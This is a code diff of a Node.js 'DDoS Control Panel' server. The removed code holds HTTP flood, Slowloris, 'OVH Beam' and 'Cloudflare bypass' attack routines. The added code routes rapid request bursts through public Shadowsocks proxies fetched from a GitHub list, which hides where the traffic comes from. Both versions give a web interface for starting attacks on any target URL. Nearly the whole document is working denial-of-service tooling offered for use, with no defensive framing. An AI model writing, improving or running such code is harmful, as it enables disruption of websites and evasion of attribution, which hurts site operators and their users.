@@ -1,366 +1,238 @@
-// server.js - High-Performance Node.js DDoS Panel (50k Request Capable)
-const fastify = require('fastify')({ 
-    logger: false,          // Disable logging for performance
-    disableRequestLogging: true,
-    connectionTimeout: 10000 // 10s timeout
-});
+// server.js - Multi-Proxy DDoS Panel using Shadowsocks (5-8 concurrent proxies)
+const fastify = require('fastify')({ logger: false });
+const { SocksProxyAgent } = require('socks-proxy-agent');
+const ss = require('shadowsocks');
+const axios = require('axios');
 
-const http = require('http');
-const https = require('https');
-const { Worker } = require('worker_threads');
-const path = require('path');
-const fs = require('fs');
+// ========== CONFIGURATION ==========
+const PROXY_LIST_URL = 'https://raw.githubusercontent.com/ebrasha/free-v2ray-public-list/main/ss_configs.txt';
+const MAX_PROXIES = 8;               // Number of Shadowsocks instances to run
+const REQS_PER_BURST = 100;           // Requests per burst (per proxy)
+const BURST_INTERVAL = 10;             // ms between bursts
 
-// Connection pooling for outgoing requests
-const httpAgent = new http.Agent({
-    keepAlive: true,
-    maxSockets: 500,        // Max concurrent outbound sockets
-    maxFreeSockets: 50,
-    timeout: 60000
-});
+// ========== STATE ==========
+let proxyConfigs = [];                 // Parsed Shadowsocks configs { method, password, server, port }
+let proxyServers = [];                 // Active Shadowsocks server instances
+let socksAgents = [];                  // SOCKS agents for each proxy
+let currentProxyIndex = 0;              // Round-robin index
+let attackActive = false;
+let attackStats = { requests: 0, errors: 0 };
 
-const httpsAgent = new https.Agent({
-    keepAlive: true,
-    maxSockets: 500,
-    maxFreeSockets: 50,
-    timeout: 60000
-});
-
-// Attack state
-let currentAttack = null;
-let attackStartTime = null;
-let stats = {
-    requestsSent: 0,
-    connections: 0,
-    errors: 0
-};
-
-// User agents (abbreviated for speed)
-const UA_LIST = [
-    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0',
-    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15',
-    'Mozilla/5.0 (X11; Linux x86_64) Chrome/119.0.0.0',
-    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1) Version/17.1 Mobile/15E148'
-];
-
-function randomUA() {
-    return UA_LIST[Math.floor(Math.random() * UA_LIST.length)];
+// ========== PROXY MANAGEMENT ==========
+// Parse a single ss:// line, return config object or null
+function parseSS(url) {
+    try {
+        // Remove trailing # and any URL fragments
+        let cleanUrl = url.split('#')[0].trim();
+        // Match pattern: ss://base64(method:password)@server:port?params
+        const match = cleanUrl.match(/^ss:\/\/([^@]+)@([^:]+):(\d+)/);
+        if (!match) return null;
+        const encoded = match[1];
+        const server = match[2];
+        const port = parseInt(match[3], 10);
+        // Decode base64 part
+        const decoded = Buffer.from(encoded, 'base64').toString();
+        const [method, password] = decoded.split(':');
+        if (!method || !password) return null;
+        return { method, password, server, port };
+    } catch (e) {
+        return null;
+    }
 }
 
-// High-performance HTTP flood (50k target)
-function startHttpFlood(target, duration, concurrency = 500) {
-    const parsed = new URL(target);
-    const agent = parsed.protocol === 'https:' ? httpsAgent : httpAgent;
-    const options = {
-        method: 'GET',
-        headers: {
-            'User-Agent': randomUA(),
-            'Accept': '*/*',
-            'Connection': 'keep-alive'
-        },
-        agent: agent,
-        timeout: 5000
-    };
-
-    let activeRequests = 0;
-    const endTime = Date.now() + (duration * 1000);
-    
-    const interval = setInterval(() => {
-        // Spawn requests up to concurrency limit
-        while (activeRequests < concurrency && Date.now() < endTime) {
-            activeRequests++;
-            
-            const req = http.request(target, options, (res) => {
-                res.on('data', () => {}); // Drain
-                res.on('end', () => {
-                    stats.requestsSent++;
-                    activeRequests--;
-                });
-            });
-            
-            req.on('error', () => {
-                stats.errors++;
-                activeRequests--;
-            });
-            
-            req.end();
-        }
-        
-        // Stop if time expired
-        if (Date.now() >= endTime) {
-            clearInterval(interval);
-        }
-    }, 10); // Check every 10ms
-    
-    return () => clearInterval(interval);
-}
-
-// Slowloris - memory-light connection holder
-function startSlowloris(target, duration) {
-    const parsed = new URL(target);
-    const host = parsed.hostname;
-    const port = parsed.port || (parsed.protocol === 'https:' ? 443 : 80);
-    
-    const sockets = [];
-    const endTime = Date.now() + (duration * 1000);
-    
-    const interval = setInterval(() => {
-        // Create new slow connections
-        for (let i = 0; i < 20; i++) {
-            if (sockets.length >= 300) break; // Cap at 300
-            
-            const socket = new net.Socket();
-            socket.connect(port, host, () => {
-                socket.write(`GET /${Math.random()} HTTP/1.1\r\nHost: ${host}\r\n`);
-                // Don't finish headers
-                stats.connections++;
-            });
-            
-            socket.on('error', () => {
-                const idx = sockets.indexOf(socket);
-                if (idx > -1) sockets.splice(idx, 1);
-                stats.connections--;
-            });
-            
-            sockets.push(socket);
-        }
-        
-        // Send keep-alive bytes to existing sockets
-        sockets.forEach(socket => {
-            try {
-                socket.write(`X-a: ${Math.random()}\r\n`);
-            } catch (e) {
-                // Socket dead, remove
-                const idx = sockets.indexOf(socket);
-                if (idx > -1) sockets.splice(idx, 1);
-                stats.connections--;
+// Fetch and parse the proxy list, return array of valid configs
+async function fetchProxyConfigs() {
+    try {
+        const response = await axios.get(PROXY_LIST_URL);
+        const lines = response.data.split('\n');
+        const configs = [];
+        for (const line of lines) {
+            if (line.startsWith('ss://')) {
+                const config = parseSS(line);
+                if (config) configs.push(config);
             }
+        }
+        console.log(`Found ${configs.length} valid Shadowsocks configs`);
+        return configs;
+    } catch (err) {
+        console.error('Failed to fetch proxy list:', err.message);
+        return [];
+    }
+}
+
+// Start a Shadowsocks server on a random local port
+async function startProxyServer(config, localPort) {
+    return new Promise((resolve, reject) => {
+        const server = ss.createServer(config);
+        server.listen(localPort, '127.0.0.1', (err) => {
+            if (err) return reject(err);
+            console.log(`Proxy ${localPort} -> ${config.server}:${config.port}`);
+            resolve(server);
         });
-        
-        // Stop if time expired
-        if (Date.now() >= endTime) {
-            clearInterval(interval);
-            sockets.forEach(s => s.destroy());
-        }
-    }, 1000);
-    
-    return () => {
-        clearInterval(interval);
-        sockets.forEach(s => s.destroy());
-    };
+        server.on('error', (err) => {
+            console.error(`Proxy ${localPort} error:`, err.message);
+        });
+    });
 }
 
-// OVH Beam method
-function startOvhBeam(target, duration, concurrency = 400) {
-    const parsed = new URL(target);
-    const agent = parsed.protocol === 'https:' ? httpsAgent : httpAgent;
-    
-    let activeRequests = 0;
-    const endTime = Date.now() + (duration * 1000);
-    
-    const interval = setInterval(() => {
-        while (activeRequests < concurrency && Date.now() < endTime) {
-            activeRequests++;
-            
-            const options = {
-                method: 'GET',
-                headers: {
-                    'User-Agent': randomUA(),
-                    'Accept': 'text/html,application/xhtml+xml',
-                    'Accept-Language': 'en-US,en;q=0.9',
-                    'Accept-Encoding': 'gzip, deflate',
-                    'Connection': 'keep-alive',
-                    'Cache-Control': 'max-age=0',
-                    'TE': 'Trailers'
-                },
-                agent: agent
-            };
-            
-            const req = http.request(target, options, (res) => {
-                res.on('data', () => {});
-                res.on('end', () => {
-                    stats.requestsSent++;
-                    activeRequests--;
-                });
-            });
-            
-            req.on('error', () => {
-                stats.errors++;
-                activeRequests--;
-            });
-            
-            req.end();
+// Start up to MAX_PROXIES servers, select random configs from pool
+async function startProxyPool() {
+    // Shuffle configs and pick first MAX_PROXIES
+    const shuffled = proxyConfigs.sort(() => 0.5 - Math.random());
+    const selected = shuffled.slice(0, MAX_PROXIES);
+
+    proxyServers = [];
+    socksAgents = [];
+    let basePort = 1080;
+
+    for (let i = 0; i < selected.length; i++) {
+        const localPort = basePort + i;
+        try {
+            const server = await startProxyServer(selected[i], localPort);
+            proxyServers.push(server);
+            socksAgents.push(new SocksProxyAgent(`socks5://127.0.0.1:${localPort}`));
+        } catch (err) {
+            console.error(`Failed to start proxy on port ${localPort}:`, err.message);
         }
-        
-        if (Date.now() >= endTime) {
-            clearInterval(interval);
-        }
-    }, 10);
-    
-    return () => clearInterval(interval);
+    }
+    console.log(`Started ${socksAgents.length} proxy servers`);
 }
 
-// Cloudflare bypass method
-function startCfBypass(target, duration, concurrency = 350) {
-    const parsed = new URL(target);
-    const agent = parsed.protocol === 'https:' ? httpsAgent : httpAgent;
-    
-    let activeRequests = 0;
-    const endTime = Date.now() + (duration * 1000);
-    
-    const interval = setInterval(() => {
-        while (activeRequests < concurrency && Date.now() < endTime) {
-            activeRequests++;
-            
-            const randomPath = `/${Math.random().toString(36).substring(7)}/${Math.random().toString(36).substring(7)}`;
-            const url = `${target}${randomPath}`;
-            
-            const options = {
-                method: 'GET',
-                headers: {
-                    'User-Agent': randomUA(),
-                    'Accept': '*/*',
-                    'Cache-Control': 'no-cache',
-                    'Pragma': 'no-cache'
-                },
-                agent: agent
-            };
-            
-            const req = http.request(url, options, (res) => {
-                res.on('data', () => {});
-                res.on('end', () => {
-                    stats.requestsSent++;
-                    activeRequests--;
-                });
-            });
-            
-            req.on('error', () => {
-                stats.errors++;
-                activeRequests--;
-            });
-            
-            req.end();
-        }
-        
-        if (Date.now() >= endTime) {
-            clearInterval(interval);
-        }
-    }, 10);
-    
-    return () => clearInterval(interval);
+// Stop all proxy servers
+async function stopProxyPool() {
+    for (const server of proxyServers) {
+        await new Promise((resolve) => server.close(resolve));
+    }
+    proxyServers = [];
+    socksAgents = [];
+    currentProxyIndex = 0;
 }
 
-// Attack method registry
-const methods = {
-    http_flood: startHttpFlood,
-    slowloris: startSlowloris,
-    ovh_beam: startOvhBeam,
-    cf_bypass: startCfBypass
-};
+// ========== ATTACK ENGINE ==========
+async function runAttack(target, duration) {
+    const endTime = Date.now() + duration * 1000;
 
-// HTML interface
+    while (attackActive && Date.now() < endTime) {
+        // Fire a burst of requests, cycling through proxies
+        for (let i = 0; i < REQS_PER_BURST; i++) {
+            if (!attackActive) break;
+
+            // Round-robin proxy selection
+            const agent = socksAgents[currentProxyIndex % socksAgents.length];
+            currentProxyIndex++;
+
+            axios.get(target, {
+                httpAgent: agent,
+                httpsAgent: agent,
+                timeout: 5000
+            }).catch(() => attackStats.errors++)
+              .finally(() => attackStats.requests++);
+        }
+        // Small delay to prevent event loop starvation
+        await new Promise(r => setTimeout(r, BURST_INTERVAL));
+    }
+
+    attackActive = false;
+    await stopProxyPool();
+}
+
+// ========== WEB INTERFACE ==========
 const html = `
 <!DOCTYPE html>
 <html>
 <head>
-    <title>⚡ NODE 50K DDOS PANEL ⚡</title>
+    <title>DDoS Control Panel</title>
     <style>
-        body { font-family: monospace; background: #0a0a0a; color: #0f0; margin: 40px; }
-        .container { max-width: 600px; margin: auto; border: 2px solid #0f0; padding: 20px; }
-        input, select, button { width: 100%; padding: 8px; margin: 8px 0; background: #1a1a1a; color: #0f0; border: 1px solid #0f0; }
-        button { cursor: pointer; font-weight: bold; font-size: 16px; }
-        button:hover { background: #0f0; color: #000; }
-        .status { padding: 10px; border: 1px solid #0f0; margin: 20px 0; text-align: center; font-size: 18px; }
-        .stats { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; margin: 15px 0; }
-        .stat-box { border: 1px solid #0f0; padding: 10px; text-align: center; }
-        .stat-value { font-size: 24px; font-weight: bold; }
-        .stat-label { font-size: 12px; color: #8f8; }
+        body { background: white; font-family: Arial, sans-serif; margin: 40px; color: #333; }
+        .container { max-width: 600px; margin: auto; border: 1px solid #ccc; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        h1 { text-align: center; color: #222; margin-bottom: 30px; }
+        label { display: block; margin: 15px 0 5px; font-weight: bold; }
+        input, select { width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; font-size: 14px; }
+        .button-group { display: flex; gap: 15px; margin: 25px 0; }
+        button { flex: 1; padding: 12px; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; transition: 0.2s; }
+        #startBtn { background: #28a745; color: white; }
+        #startBtn:hover { background: #218838; }
+        #stopBtn { background: #dc3545; color: white; }
+        #stopBtn:hover { background: #c82333; }
+        .status { text-align: center; padding: 15px; background: #f8f9fa; border-radius: 4px; margin: 20px 0; font-size: 18px; border: 1px solid #eee; }
+        .stats { display: flex; justify-content: space-around; margin: 20px 0; }
+        .stat-box { text-align: center; }
+        .stat-value { font-size: 28px; font-weight: bold; color: #007bff; }
+        .stat-label { font-size: 12px; color: #666; text-transform: uppercase; margin-top: 5px; }
+        .footer { text-align: center; font-size: 12px; color: #999; margin-top: 30px; }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>⚡ 50K REQUEST DDOS PANEL ⚡</h1>
-        <div class="status" id="status">⚪ IDLE</div>
-        
+        <h1>DDoS Control Panel</h1>
+
+        <div class="status" id="status">Idle</div>
+
         <div class="stats">
             <div class="stat-box">
                 <div class="stat-value" id="reqCount">0</div>
-                <div class="stat-label">REQUESTS SENT</div>
+                <div class="stat-label">Requests</div>
             </div>
             <div class="stat-box">
-                <div class="stat-value" id="connCount">0</div>
-                <div class="stat-label">CONNECTIONS</div>
+                <div class="stat-value" id="errCount">0</div>
+                <div class="stat-label">Errors</div>
+            </div>
+            <div class="stat-box">
+                <div class="stat-value" id="proxyCount">0</div>
+                <div class="stat-label">Proxies</div>
             </div>
         </div>
-        
-        <label>Target URL (https://example.com or http://ip:port)</label>
-        <input id="target" placeholder="https://example.com">
-        
-        <label>Duration (seconds)</label>
-        <input id="duration" type="number" value="60" min="1" max="3600">
-        
-        <label>Concurrency (100-1000, higher = more RAM)</label>
-        <input id="concurrency" type="number" value="400" min="100" max="1000">
-        
-        <label>Attack Method</label>
-        <select id="method">
-            <option value="http_flood">HTTP Flood (50k target)</option>
-            <option value="slowloris">Slowloris (low RAM)</option>
-            <option value="ovh_beam">OVH BEAM</option>
-            <option value="cf_bypass">Cloudflare Bypass</option>
-        </select>
-        
-        <button onclick="startAttack()">🚀 START ATTACK</button>
-        <button onclick="stopAttack()">⛔ STOP ATTACK</button>
-        
-        <p style="text-align: center; font-size: 12px; color: #8f8; margin-top: 20px;">
-            Memory: 512MB limit • Concurrency 400-600 recommended
-        </p>
+
+        <label for="target">Target URL (http:// or https://)</label>
+        <input type="url" id="target" placeholder="https://example.com" required>
+
+        <label for="duration">Duration (seconds)</label>
+        <input type="number" id="duration" value="60" min="1" max="3600">
+
+        <div class="button-group">
+            <button id="startBtn">START ATTACK</button>
+            <button id="stopBtn">STOP ATTACK</button>
+        </div>
+
+        <div class="footer">
+            Using up to 8 concurrent Shadowsocks proxies from ebrasha/free-v2ray-public-list
+        </div>
     </div>
-    
+
     <script>
-        let statusInterval;
-        
         async function updateStatus() {
             const res = await fetch('/status');
             const data = await res.json();
-            document.getElementById('status').innerText = data.running ? '🔥 ATTACK RUNNING 🔥' : '⚪ IDLE';
-            document.getElementById('reqCount').innerText = data.stats.requestsSent.toLocaleString();
-            document.getElementById('connCount').innerText = data.stats.connections.toLocaleString();
+            document.getElementById('status').innerText = data.running ? '🔥 ATTACK RUNNING' : '⚪ IDLE';
+            document.getElementById('reqCount').innerText = data.stats.requests;
+            document.getElementById('errCount').innerText = data.stats.errors;
+            document.getElementById('proxyCount').innerText = data.proxies;
         }
-        
+
         async function startAttack() {
             const target = document.getElementById('target').value;
-            const duration = document.getElementById('duration').value;
-            const method = document.getElementById('method').value;
-            const concurrency = document.getElementById('concurrency').value;
-            
-            if (!target) return alert('Enter target URL');
-            
+            const duration = parseInt(document.getElementById('duration').value);
+
+            if (!target) return alert('Please enter a target URL');
+
             const res = await fetch('/start', {
                 method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({target, duration, method, concurrency: parseInt(concurrency)})
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ target, duration })
             });
             const data = await res.json();
-            if (data.success) {
-                updateStatus();
-                statusInterval = setInterval(updateStatus, 1000);
-            } else {
-                alert(data.message);
-            }
+            if (!data.success) alert(data.error);
+            else updateStatus();
         }
-        
+
         async function stopAttack() {
-            const res = await fetch('/stop', {method: 'POST'});
+            const res = await fetch('/stop', { method: 'POST' });
             const data = await res.json();
-            if (data.success) {
-                if (statusInterval) clearInterval(statusInterval);
-                updateStatus();
-            }
+            if (data.success) updateStatus();
         }
-        
-        // Auto-refresh status
+
+        document.getElementById('startBtn').addEventListener('click', startAttack);
+        document.getElementById('stopBtn').addEventListener('click', stopAttack);
         setInterval(updateStatus, 1000);
         updateStatus();
     </script>
@@ -368,67 +240,74 @@ const html = `
 </html>
 `;
 
-// Fastify routes
-fastify.get('/', (req, reply) => {
-    reply.type('text/html').send(html);
-});
+// ========== FASTIFY ROUTES ==========
+fastify.get('/', (req, reply) => reply.type('text/html').send(html));
 
 fastify.get('/status', (req, reply) => {
     reply.send({
-        running: currentAttack !== null,
-        stats: stats
+        running: attackActive,
+        stats: attackStats,
+        proxies: socksAgents.length
     });
 });
 
-fastify.post('/start', (req, reply) => {
-    const { target, duration, method, concurrency = 400 } = req.body;
-    
-    if (!target || !duration || !method) {
-        return reply.status(400).send({ success: false, message: 'Missing parameters' });
+fastify.post('/start', async (req, reply) => {
+    const { target, duration } = req.body;
+    if (!target || !duration) {
+        return reply.status(400).send({ success: false, error: 'Missing target or duration' });
     }
-    
-    if (currentAttack) {
-        clearInterval(currentAttack);
-        currentAttack = null;
+
+    // Stop any ongoing attack
+    attackActive = false;
+    await stopProxyPool();
+
+    // Ensure we have proxies
+    if (proxyConfigs.length === 0) {
+        proxyConfigs = await fetchProxyConfigs();
     }
-    
-    if (!methods[method]) {
-        return reply.status(400).send({ success: false, message: 'Invalid method' });
+    if (proxyConfigs.length === 0) {
+        return reply.status(500).send({ success: false, error: 'No proxies available' });
     }
-    
-    // Reset stats
-    stats = { requestsSent: 0, connections: 0, errors: 0 };
-    
-    // Start attack
-    currentAttack = methods[method](target, parseInt(duration), parseInt(concurrency));
-    
-    // Auto-stop after duration
-    setTimeout(() => {
-        if (currentAttack) {
-            clearInterval(currentAttack);
-            currentAttack = null;
-        }
-    }, duration * 1000);
-    
+
+    // Start proxy pool
+    try {
+        await startProxyPool();
+    } catch (err) {
+        return reply.status(500).send({ success: false, error: 'Failed to start proxies' });
+    }
+
+    if (socksAgents.length === 0) {
+        return reply.status(500).send({ success: false, error: 'No proxies could be started' });
+    }
+
+    // Reset stats and start attack
+    attackStats = { requests: 0, errors: 0 };
+    attackActive = true;
+
+    // Run attack asynchronously
+    runAttack(target, duration).catch(console.error);
+
     reply.send({ success: true });
 });
 
-fastify.post('/stop', (req, reply) => {
-    if (currentAttack) {
-        clearInterval(currentAttack);
-        currentAttack = null;
-        reply.send({ success: true });
-    } else {
-        reply.send({ success: false, message: 'No attack running' });
-    }
+fastify.post('/stop', async (req, reply) => {
+    attackActive = false;
+    await stopProxyPool();
+    reply.send({ success: true });
 });
 
-// Start server
-const port = process.env.PORT || 5000;
-fastify.listen({ port: port, host: '0.0.0.0' }, (err) => {
-    if (err) {
-        console.error(err);
-        process.exit(1);
-    }
-    console.log(`⚡ 50K DDoS panel running on port ${port}`);
-});
+// ========== INIT ==========
+async function init() {
+    // Pre-fetch proxy list on startup
+    proxyConfigs = await fetchProxyConfigs();
+    const port = process.env.PORT || 5000;
+    fastify.listen({ port, host: '0.0.0.0' }, (err) => {
+        if (err) {
+            console.error(err);
+            process.exit(1);
+        }
+        console.log(`Panel running on port ${port}`);
+    });
+}
+
+init();
